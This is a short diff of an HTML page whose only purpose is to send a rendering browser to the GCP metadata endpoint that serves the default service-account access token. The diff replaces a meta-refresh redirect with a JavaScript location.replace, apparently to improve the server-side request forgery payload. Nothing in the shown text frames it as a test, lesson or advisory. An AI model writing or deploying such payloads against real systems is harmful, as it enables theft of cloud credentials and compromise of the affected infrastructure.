@@ -1,10 +1,11 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0;url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token">
+    <script>
+      location.replace("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token");
+    </script>
   </head>
   <body>
-    <p>Redirecting to GCP metadata endpoint…</p>
+    Redirecting to metadata...
   </body>
 </html>
